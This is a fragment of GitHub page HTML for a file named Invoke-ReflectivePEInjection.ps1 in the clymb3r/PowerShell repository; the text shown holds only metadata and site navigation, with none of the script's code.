      <meta name="description" content="Useful PowerShell scripts. Contribute to clymb3r/PowerShell development by creating an account on GitHub.">
      <link rel="search" type="application/opensearchdescription+xml" href="/opensearch.xml" title="GitHub">
    <link rel="fluid-icon" href="https://github.com/fluidicon.png" title="GitHub">
    <meta property="fb:app_id" content="1401488693436528">
    <meta name="apple-itunes-app" content="app-id=1477376905" />
      <meta name="twitter:image:src" content="https://opengraph.githubassets.com/a20c6accb8f23e6d64dacacff0c6c1f577ee7bc4e6dde4a6d090b6db781ae1dd/clymb3r/PowerShell" /><meta name="twitter:site" content="@github" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="PowerShell/Invoke-ReflectivePEInjection.ps1 at master · clymb3r/PowerShell" /><meta name="twitter:description" content="Useful PowerShell scripts. Contribute to clymb3r/PowerShell development by creating an account on GitHub." />
      <meta property="og:image" content="https://opengraph.githubassets.com/a20c6accb8f23e6d64dacacff0c6c1f577ee7bc4e6dde4a6d090b6db781ae1dd/clymb3r/PowerShell" /><meta property="og:image:alt" content="Useful PowerShell scripts. Contribute to clymb3r/PowerShell development by creating an account on GitHub." /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="600" /><meta property="og:site_name" content="GitHub" /><meta property="og:type" content="object" /><meta property="og:title" content="PowerShell/Invoke-ReflectivePEInjection.ps1 at master · clymb3r/PowerShell" /><meta property="og:url" content="https://github.com/clymb3r/PowerShell" /><meta property="og:description" content="Useful PowerShell scripts. Contribute to clymb3r/PowerShell development by creating an account on GitHub." />
      
    <link rel="assets" href="https://github.githubassets.com/">


        <meta name="hostname" content="github.com">



        <meta name="expected-hostname" content="github.com">

    <meta name="enabled-features" content="TURBO_EXPERIMENT_RISKY,IMAGE_METRIC_TRACKING,GEOJSON_AZURE_MAPS">


  <meta http-equiv="x-pjax-version" content="adbefbb30cc9e6bf30f8a5d28c13ebd12b56500efb92694f4c914710861bb3e6" data-turbo-track="reload">
  <meta http-equiv="x-pjax-csp-version" content="0db263f9a873141d8256f783c35f244c06d490aacc3b680f99794dd8fd59fb59" data-turbo-track="reload">
  <meta http-equiv="x-pjax-css-version" content="bb9fa2fabb43ec5c9e06212854a00dc829061571cbe6be16734f29eed6ebe83f" data-turbo-track="reload">
  <meta http-equiv="x-pjax-js-version" content="2b8684439a381242e10550291f727f332a0a40d74e9410923fc0a1517c5ce802" data-turbo-track="reload">

  <meta name="turbo-cache-control" content="no-preview" data-turbo-transient="">

        <meta data-hydrostats="publish">

  <meta name="go-import" content="github.com/clymb3r/PowerShell git https://github.com/clymb3r/PowerShell.git">

  <meta name="octolytics-dimension-user_id" content="4003012" /><meta name="octolytics-dimension-user_login" content="clymb3r" /><meta name="octolytics-dimension-repository_id" content="9093330" /><meta name="octolytics-dimension-repository_nwo" content="clymb3r/PowerShell" /><meta name="octolytics-dimension-repository_public" content="true" /><meta name="octolytics-dimension-repository_is_fork" content="false" /><meta name="octolytics-dimension-repository_network_root_id" content="9093330" /><meta name="octolytics-dimension-repository_network_root_nwo" content="clymb3r/PowerShell" />



    <link rel="canonical" href="https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1" data-turbo-transient>
  <meta name="turbo-body-classes" content="logged-out env-production page-responsive page-blob">


  <meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">

  <meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">

  <meta name="browser-optimizely-client-errors-url" content="https://api.github.com/_private/browser/optimizely_client/errors">

  <link rel="mask-icon" href="https://github.githubassets.com/pinned-octocat.svg" color="#000000">
  <link rel="alternate icon" class="js-site-favicon" type="image/png" href="https://github.githubassets.com/favicons/favicon.png">
  <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg">

<meta name="theme-color" content="#1e2327">
<meta name="color-scheme" content="light dark" />


  <link rel="manifest" href="/manifest.json" crossOrigin="use-credentials">

  </head>

  <body class="logged-out env-production page-responsive page-blob" style="word-wrap: break-word;">
    <div data-turbo-body class="logged-out env-production page-responsive page-blob" style="word-wrap: break-word;">
      


    <div class="position-relative js-header-wrapper ">
      <a href="#start-of-content" class="px-2 py-4 color-bg-accent-emphasis color-fg-on-emphasis show-on-focus js-skip-to-content">Skip to content</a>
      <span data-view-component="true" class="progress-pjax-loader Progress position-fixed width-full">
    <span style="width: 0%;" data-view-component="true" class="Progress-item progress-pjax-loader-bar left-0 top-0 color-bg-accent-emphasis"></span>
</span>      
      


        

            <script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/sessions-4849c97a18f4.js"></script>
<header class="Header-old header-logged-out js-details-container Details position-relative f4 py-3" role="banner">
  <button type="button" class="Header-backdrop d-lg-none border-0 position-fixed top-0 left-0 width-full height-full js-details-target" aria-label="Toggle navigation">
    <span class="d-none">Toggle navigation</span>
  </button>

  <div class="container-xl d-flex flex-column flex-lg-row flex-items-center p-responsive height-full position-relative z-1">
    <div class="d-flex flex-justify-between flex-items-center width-full width-lg-auto">
      <a class="mr-lg-3 color-fg-inherit flex-order-2" href="https://github.com/" aria-label="Homepage" data-ga-click="(Logged out) Header, go to homepage, icon:logo-wordmark">
        <svg height="32" aria-hidden="true" viewBox="0 0 16 16" version="1.1" width="32" data-view-component="true" class="octicon octicon-mark-github">
    <path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path>
</svg>
      </a>

        <div class="flex-1">
          <a href="/signup?ref_cta=Sign+up&amp;ref_loc=header+logged+out&amp;ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&amp;source=header-repo"
            class="d-inline-block d-lg-none flex-order-1 f5 no-underline border color-border-default rounded-2 px-2 py-1 color-fg-inherit"
            data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;site header&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="cc7175fe3426b11fbe4d06f5e171b3497198f28cd55a7844280f4f5989ee5b0c"
          >
            Sign&nbsp;up
          </a>
        </div>

      <div class="flex-1 flex-order-2 text-right">
          <button aria-label="Toggle navigation" aria-expanded="false" type="button" data-view-component="true" class="js-details-target Button--link Button--medium Button d-lg-none color-fg-inherit p-1">    <span class="Button-content">
      <span class="Button-label"><div class="HeaderMenu-toggle-bar rounded my-1"></div>
            <div class="HeaderMenu-toggle-bar rounded my-1"></div>
            <div class="HeaderMenu-toggle-bar rounded my-1"></div></span>
    </span>
</button>  
      </div>
    </div>


    <div class="HeaderMenu--logged-out p-responsive height-fit position-lg-relative d-lg-flex flex-column flex-auto pt-7 pb-4 top-0">
      <div class="header-menu-wrapper d-flex flex-column flex-self-end flex-lg-row flex-justify-between flex-auto p-3 p-lg-0 rounded rounded-lg-0 mt-3 mt-lg-0">
          <nav class="mt-0 px-3 px-lg-0 mb-3 mb-lg-0" aria-label="Global">
            <ul class="d-lg-flex list-style-none">
                <li class="HeaderMenu-item position-relative flex-wrap flex-justify-between flex-items-center d-block d-lg-flex flex-lg-nowrap flex-lg-items-center js-details-container js-header-menu-item">
      <button type="button" class="HeaderMenu-link border-0 width-full width-lg-auto px-0 px-lg-2 py-3 py-lg-2 no-wrap d-flex flex-items-center flex-justify-between js-details-target" aria-expanded="false">
        Product
        <svg opacity="0.5" aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-chevron-down HeaderMenu-icon ml-1">
    <path d="M12.78 5.22a.749.749 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.06 0L3.22 6.28a.749.749 0 1 1 1.06-1.06L8 8.939l3.72-3.719a.749.749 0 0 1 1.06 0Z"></path>
</svg>
      </button>
      <div class="HeaderMenu-dropdown dropdown-menu rounded m-0 p-0 py-2 py-lg-4 position-relative position-lg-absolute left-0 left-lg-n3 d-lg-flex dropdown-menu-wide">
          <ul class="list-style-none f5 px-lg-4 border-lg-right mb-4 mb-lg-0 pr-lg-7">

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center pb-lg-3" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Actions&quot;,&quot;label&quot;:&quot;ref_cta:Actions;&quot;}" href="/features/actions">
      <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-workflow color-fg-subtle mr-3">
    <path d="M1 3a2 2 0 0 1 2-2h6.5a2 2 0 0 1 2 2v6.5a2 2 0 0 1-2 2H7v4.063C7 16.355 7.644 17 8.438 17H12.5v-2.5a2 2 0 0 1 2-2H21a2 2 0 0 1 2 2V21a2 2 0 0 1-2 2h-6.5a2 2 0 0 1-2-2v-2.5H8.437A2.939 2.939 0 0 1 5.5 15.562V11.5H3a2 2 0 0 1-2-2Zm2-.5a.5.5 0 0 0-.5.5v6.5a.5.5 0 0 0 .5.5h6.5a.5.5 0 0 0 .5-.5V3a.5.5 0 0 0-.5-.5ZM14.5 14a.5.5 0 0 0-.5.5V21a.5.5 0 0 0 .5.5H21a.5.5 0 0 0 .5-.5v-6.5a.5.5 0 0 0-.5-.5Z"></path>
</svg>
      <div>
        <div class="color-fg-default h4">Actions</div>
        Automate any workflow
      </div>

    
</a></li>

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center pb-lg-3" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Packages&quot;,&quot;label&quot;:&quot;ref_cta:Packages;&quot;}" href="/features/packages">
      <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-package color-fg-subtle mr-3">
    <path d="M12.876.64V.639l8.25 4.763c.541.313.875.89.875 1.515v9.525a1.75 1.75 0 0 1-.875 1.516l-8.25 4.762a1.748 1.748 0 0 1-1.75 0l-8.25-4.763a1.75 1.75 0 0 1-.875-1.515V6.917c0-.625.334-1.202.875-1.515L11.126.64a1.748 1.748 0 0 1 1.75 0Zm-1 1.298L4.251 6.34l7.75 4.474 7.75-4.474-7.625-4.402a.248.248 0 0 0-.25 0Zm.875 19.123 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474ZM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947Z"></path>
</svg>
      <div>
        <div class="color-fg-default h4">Packages</div>
        Host and manage packages
      </div>

    
</a></li>

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center pb-lg-3" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Security&quot;,&quot;label&quot;:&quot;ref_cta:Security;&quot;}" href="/features/security">
      <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-shield-check color-fg-subtle mr-3">
    <path d="M16.53 9.78a.75.75 0 0 0-1.06-1.06L11 13.19l-1.97-1.97a.75.75 0 0 0-1.06 1.06l2.5 2.5a.75.75 0 0 0 1.06 0l5-5Z"></path><path d="m12.54.637 8.25 2.675A1.75 1.75 0 0 1 22 4.976V10c0 6.19-3.771 10.704-9.401 12.83a1.704 1.704 0 0 1-1.198 0C5.77 20.705 2 16.19 2 10V4.976c0-.758.489-1.43 1.21-1.664L11.46.637a1.748 1.748 0 0 1 1.08 0Zm-.617 1.426-8.25 2.676a.249.249 0 0 0-.173.237V10c0 5.46 3.28 9.483 8.43 11.426a.199.199 0 0 0 .14 0C17.22 19.483 20.5 15.461 20.5 10V4.976a.25.25 0 0 0-.173-.237l-8.25-2.676a.253.253 0 0 0-.154 0Z"></path>
</svg>
      <div>
        <div class="color-fg-default h4">Security</div>
        Find and fix vulnerabilities
      </div>

    
</a></li>

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center pb-lg-3" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Codespaces&quot;,&quot;label&quot;:&quot;ref_cta:Codespaces;&quot;}" href="/features/codespaces">
      <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-codespaces color-fg-subtle mr-3">
    <path d="M3.5 3.75C3.5 2.784 4.284 2 5.25 2h13.5c.966 0 1.75.784 1.75 1.75v7.5A1.75 1.75 0 0 1 18.75 13H5.25a1.75 1.75 0 0 1-1.75-1.75Zm-2 12c0-.966.784-1.75 1.75-1.75h17.5c.966 0 1.75.784 1.75 1.75v4a1.75 1.75 0 0 1-1.75 1.75H3.25a1.75 1.75 0 0 1-1.75-1.75ZM5.25 3.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h13.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Zm-2 12a.25.25 0 0 0-.25.25v4c0 .138.112.25.25.25h17.5a.25.25 0 0 0 .25-.25v-4a.25.25 0 0 0-.25-.25Z"></path><path d="M10 17.75a.75.75 0 0 1 .75-.75h6.5a.75.75 0 0 1 0 1.5h-6.5a.75.75 0 0 1-.75-.75Zm-4 0a.75.75 0 0 1 .75-.75h.5a.75.75 0 0 1 0 1.5h-.5a.75.75 0 0 1-.75-.75Z"></path>
</svg>
      <div>
        <div class="color-fg-default h4">Codespaces</div>
        Instant dev environments
      </div>

    
</a></li>

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center pb-lg-3" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Copilot&quot;,&quot;label&quot;:&quot;ref_cta:Copilot;&quot;}" href="/features/copilot">
      <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-copilot color-fg-subtle mr-3">
    <path d="M9.75 14a.75.75 0 0 1 .75.75v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 .75-.75Zm4.5 0a.75.75 0 0 1 .75.75v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 .75-.75Z"></path><path d="M12 2c2.214 0 4.248.657 5.747 1.756.136.099.268.204.397.312.584.235 1.077.546 1.474.952.85.869 1.132 2.037 1.132 3.368 0 .368-.014.733-.052 1.086l.633 1.478.043.022A4.75 4.75 0 0 1 24 15.222v1.028c0 .529-.309.987-.565 1.293-.28.336-.636.653-.966.918a13.84 13.84 0 0 1-1.299.911l-.024.015-.006.004-.039.025c-.223.135-.45.264-.68.386-.46.245-1.122.571-1.941.895C16.845 21.344 14.561 22 12 22c-2.561 0-4.845-.656-6.479-1.303a19.046 19.046 0 0 1-1.942-.894 14.081 14.081 0 0 1-.535-.3l-.144-.087-.04-.025-.006-.004-.024-.015a13.16 13.16 0 0 1-1.299-.911 6.913 6.913 0 0 1-.967-.918C.31 17.237 0 16.779 0 16.25v-1.028a4.75 4.75 0 0 1 2.626-4.248l.043-.022.633-1.478a10.195 10.195 0 0 1-.052-1.086c0-1.331.282-2.498 1.132-3.368.397-.406.89-.717 1.474-.952.129-.108.261-.213.397-.312C7.752 2.657 9.786 2 12 2Zm-8 9.654v6.669a17.59 17.59 0 0 0 2.073.98C7.595 19.906 9.686 20.5 12 20.5c2.314 0 4.405-.594 5.927-1.197a17.59 17.59 0 0 0 2.073-.98v-6.669l-.038-.09c-.046.061-.095.12-.145.177-.793.9-2.057 1.259-3.782 1.259-1.59 0-2.738-.544-3.508-1.492a4.323 4.323 0 0 1-.355-.508h-.344a4.323 4.323 0 0 1-.355.508C10.704 12.456 9.555 13 7.965 13c-1.725 0-2.989-.359-3.782-1.259a3.026 3.026 0 0 1-.145-.177Zm6.309-1.092c.445-.547.708-1.334.851-2.301.057-.357.087-.718.09-1.079v-.031c-.001-.762-.166-1.26-.43-1.568l-.008-.01c-.341-.391-1.046-.689-2.533-.529-1.505.163-2.347.537-2.824 1.024-.462.473-.705 1.18-.705 2.32 0 .605.044 1.087.135 1.472.092.384.231.672.423.89.365.413 1.084.75 2.657.75.91 0 1.527-.223 1.964-.564.14-.11.268-.235.38-.374Zm2.504-2.497c.136 1.057.403 1.913.878 2.497.442.545 1.134.938 2.344.938 1.573 0 2.292-.337 2.657-.751.384-.435.558-1.151.558-2.361 0-1.14-.243-1.847-.705-2.319-.477-.488-1.318-.862-2.824-1.025-1.487-.161-2.192.139-2.533.529-.268.308-.437.808-.438 1.578v.02c.002.299.023.598.063.894Z"></path>
</svg>
      <div>
        <div class="color-fg-default h4">Copilot</div>
        Write better code with AI
      </div>

    
</a></li>

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center pb-lg-3" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Code review&quot;,&quot;label&quot;:&quot;ref_cta:Code review;&quot;}" href="/features/code-review">
      <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-code-review color-fg-subtle mr-3">
    <path d="M10.3 6.74a.75.75 0 0 1-.04 1.06l-2.908 2.7 2.908 2.7a.75.75 0 1 1-1.02 1.1l-3.5-3.25a.75.75 0 0 1 0-1.1l3.5-3.25a.75.75 0 0 1 1.06.04Zm3.44 1.06a.75.75 0 1 1 1.02-1.1l3.5 3.25a.75.75 0 0 1 0 1.1l-3.5 3.25a.75.75 0 1 1-1.02-1.1l2.908-2.7-2.908-2.7Z"></path><path d="M1.5 4.25c0-.966.784-1.75 1.75-1.75h17.5c.966 0 1.75.784 1.75 1.75v12.5a1.75 1.75 0 0 1-1.75 1.75h-9.69l-3.573 3.573A1.458 1.458 0 0 1 5 21.043V18.5H3.25a1.75 1.75 0 0 1-1.75-1.75ZM3.25 4a.25.25 0 0 0-.25.25v12.5c0 .138.112.25.25.25h2.5a.75.75 0 0 1 .75.75v3.19l3.72-3.72a.749.749 0 0 1 .53-.22h10a.25.25 0 0 0 .25-.25V4.25a.25.25 0 0 0-.25-.25Z"></path>
</svg>
      <div>
        <div class="color-fg-default h4">Code review</div>
        Manage code changes
      </div>

    
</a></li>

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center pb-lg-3" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Issues&quot;,&quot;label&quot;:&quot;ref_cta:Issues;&quot;}" href="/features/issues">
      <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-issue-opened color-fg-subtle mr-3">
    <path d="M12 1c6.075 0 11 4.925 11 11s-4.925 11-11 11S1 18.075 1 12 5.925 1 12 1ZM2.5 12a9.5 9.5 0 0 0 9.5 9.5 9.5 9.5 0 0 0 9.5-9.5A9.5 9.5 0 0 0 12 2.5 9.5 9.5 0 0 0 2.5 12Zm9.5 2a2 2 0 1 1-.001-3.999A2 2 0 0 1 12 14Z"></path>
</svg>
      <div>
        <div class="color-fg-default h4">Issues</div>
        Plan and track work
      </div>

    
</a></li>

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Discussions&quot;,&quot;label&quot;:&quot;ref_cta:Discussions;&quot;}" href="/features/discussions">
      <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-comment-discussion color-fg-subtle mr-3">
    <path d="M1.75 1h12.5c.966 0 1.75.784 1.75 1.75v9.5A1.75 1.75 0 0 1 14.25 14H8.061l-2.574 2.573A1.458 1.458 0 0 1 3 15.543V14H1.75A1.75 1.75 0 0 1 0 12.25v-9.5C0 1.784.784 1 1.75 1ZM1.5 2.75v9.5c0 .138.112.25.25.25h2a.75.75 0 0 1 .75.75v2.19l2.72-2.72a.749.749 0 0 1 .53-.22h6.5a.25.25 0 0 0 .25-.25v-9.5a.25.25 0 0 0-.25-.25H1.75a.25.25 0 0 0-.25.25Z"></path><path d="M22.5 8.75a.25.25 0 0 0-.25-.25h-3.5a.75.75 0 0 1 0-1.5h3.5c.966 0 1.75.784 1.75 1.75v9.5A1.75 1.75 0 0 1 22.25 20H21v1.543a1.457 1.457 0 0 1-2.487 1.03L15.939 20H10.75A1.75 1.75 0 0 1 9 18.25v-1.465a.75.75 0 0 1 1.5 0v1.465c0 .138.112.25.25.25h5.5a.75.75 0 0 1 .53.22l2.72 2.72v-2.19a.75.75 0 0 1 .75-.75h2a.25.25 0 0 0 .25-.25v-9.5Z"></path>
</svg>
      <div>
        <div class="color-fg-default h4">Discussions</div>
        Collaborate outside of code
      </div>

    
</a></li>

          </ul>
          <ul class="list-style-none f5 px-lg-4">
              <li class="h4 color-fg-default my-1">Explore</li>

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to All features&quot;,&quot;label&quot;:&quot;ref_cta:All features;&quot;}" href="/features">
      All features

    
</a></li>

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary" target="_blank" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Documentation&quot;,&quot;label&quot;:&quot;ref_cta:Documentation;&quot;}" href="https://docs.github.com">
      Documentation

    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-link-external HeaderMenu-external-icon color-fg-subtle">
    <path d="M3.75 2h3.5a.75.75 0 0 1 0 1.5h-3.5a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-3.5a.75.75 0 0 1 1.5 0v3.5A1.75 1.75 0 0 1 12.25 14h-8.5A1.75 1.75 0 0 1 2 12.25v-8.5C2 2.784 2.784 2 3.75 2Zm6.854-1h4.146a.25.25 0 0 1 .25.25v4.146a.25.25 0 0 1-.427.177L13.03 4.03 9.28 7.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.75-3.75-1.543-1.543A.25.25 0 0 1 10.604 1Z"></path>
</svg>
</a></li>

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary" target="_blank" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to GitHub Skills&quot;,&quot;label&quot;:&quot;ref_cta:GitHub Skills;&quot;}" href="https://skills.github.com/">
      GitHub Skills

    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-link-external HeaderMenu-external-icon color-fg-subtle">
    <path d="M3.75 2h3.5a.75.75 0 0 1 0 1.5h-3.5a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-3.5a.75.75 0 0 1 1.5 0v3.5A1.75 1.75 0 0 1 12.25 14h-8.5A1.75 1.75 0 0 1 2 12.25v-8.5C2 2.784 2.784 2 3.75 2Zm6.854-1h4.146a.25.25 0 0 1 .25.25v4.146a.25.25 0 0 1-.427.177L13.03 4.03 9.28 7.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.75-3.75-1.543-1.543A.25.25 0 0 1 10.604 1Z"></path>
</svg>
</a></li>

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary" target="_blank" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Product&quot;,&quot;action&quot;:&quot;click to go to Blog&quot;,&quot;label&quot;:&quot;ref_cta:Blog;&quot;}" href="https://github.blog">
      Blog

    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-link-external HeaderMenu-external-icon color-fg-subtle">
    <path d="M3.75 2h3.5a.75.75 0 0 1 0 1.5h-3.5a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-3.5a.75.75 0 0 1 1.5 0v3.5A1.75 1.75 0 0 1 12.25 14h-8.5A1.75 1.75 0 0 1 2 12.25v-8.5C2 2.784 2.784 2 3.75 2Zm6.854-1h4.146a.25.25 0 0 1 .25.25v4.146a.25.25 0 0 1-.427.177L13.03 4.03 9.28 7.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.75-3.75-1.543-1.543A.25.25 0 0 1 10.604 1Z"></path>
</svg>
</a></li>

          </ul>
      </div>
</li>


                <li class="HeaderMenu-item position-relative flex-wrap flex-justify-between flex-items-center d-block d-lg-flex flex-lg-nowrap flex-lg-items-center js-details-container js-header-menu-item">
      <button type="button" class="HeaderMenu-link border-0 width-full width-lg-auto px-0 px-lg-2 py-3 py-lg-2 no-wrap d-flex flex-items-center flex-justify-between js-details-target" aria-expanded="false">
        Solutions
        <svg opacity="0.5" aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-chevron-down HeaderMenu-icon ml-1">
    <path d="M12.78 5.22a.749.749 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.06 0L3.22 6.28a.749.749 0 1 1 1.06-1.06L8 8.939l3.72-3.719a.749.749 0 0 1 1.06 0Z"></path>
</svg>
      </button>
      <div class="HeaderMenu-dropdown dropdown-menu rounded m-0 p-0 py-2 py-lg-4 position-relative position-lg-absolute left-0 left-lg-n3 px-lg-4">
          <ul class="list-style-none f5 border-bottom pb-3 mb-3">
              <li class="h4 color-fg-default my-1">For</li>

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Solutions&quot;,&quot;action&quot;:&quot;click to go to Enterprise&quot;,&quot;label&quot;:&quot;ref_cta:Enterprise;&quot;}" href="/enterprise">
      Enterprise

    
</a></li>

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Solutions&quot;,&quot;action&quot;:&quot;click to go to Teams&quot;,&quot;label&quot;:&quot;ref_cta:Teams;&quot;}" href="/team">
      Teams

    
</a></li>

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Solutions&quot;,&quot;action&quot;:&quot;click to go to Startups&quot;,&quot;label&quot;:&quot;ref_cta:Startups;&quot;}" href="/enterprise/startups">
      Startups

    
</a></li>

              <li>
  <a class="HeaderMenu-dropdown-link lh-condensed d-block no-underline position-relative py-2 Link--secondary" target="_blank" data-analytics-event="{&quot;category&quot;:&quot;Header dropdown (logged out), Solutions&quot;,&quot;action&quot;:&quot;click to go to Education&quot;,&quot;label&quot;:&quot;ref_cta:Education;&quot;}" href="https://education.github.com">
      Education

    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-link-external HeaderMenu-external-icon color-fg-subtle">
    <path d="M3.75 2h3.5a.75.75 0 0 1 0 1.5h-3.5a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-3.5a.75.75 0 0 1 1.5 0v3.5A1.75 1.75 0 0 1 12.25 14h-8.5A1.75 1.75 0 0 1 2 12.25v-8.5C2 2.784 2.784 2 3.75 2Zm6.854-1h4.146a.25.25 0 0 1 .25.25v4.146a.25.25 0 0 1-.427.177L13.03 4.03 9.28 7.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.75-3.75-1.543-1.543A.25.25 0 0 1 10.604 1Z"></path>
</svg>
</a></li>

          </ul>
          <ul class="list-style-none f5 border-bottom pb-3 mb-3">
              <li class="h4 color-fg-default my-1">By Solution</li>

              <li>
